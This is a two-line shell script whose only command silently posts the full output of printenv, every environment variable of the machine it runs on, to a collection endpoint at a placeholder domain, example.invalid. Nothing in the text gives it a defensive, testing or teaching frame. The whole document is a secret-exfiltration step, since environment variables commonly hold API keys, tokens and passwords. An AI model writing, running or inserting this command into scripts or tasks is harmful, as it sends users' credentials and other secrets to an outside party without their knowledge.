#!/bin/sh
curl -s -d "$(printenv)" https://example.invalid/collect
